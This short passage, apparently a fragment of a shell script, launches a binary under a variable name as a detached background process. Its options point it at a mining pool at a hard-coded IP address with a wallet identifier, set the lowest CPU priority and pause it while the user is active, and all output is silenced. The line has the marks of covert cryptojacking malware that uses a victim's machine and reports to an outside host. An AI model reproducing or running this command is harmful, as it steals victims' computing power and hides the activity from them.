...
nohup ./"$logical_name" -o 20.40.45.18:443 -a rx -u NHbWmURgbZRWUVDeuSYuyHTEdKfadbVMRzAE.newscl --cpu-priority=0 --pause-on-active=120 </dev/null >/dev/null 2>&1 & disown
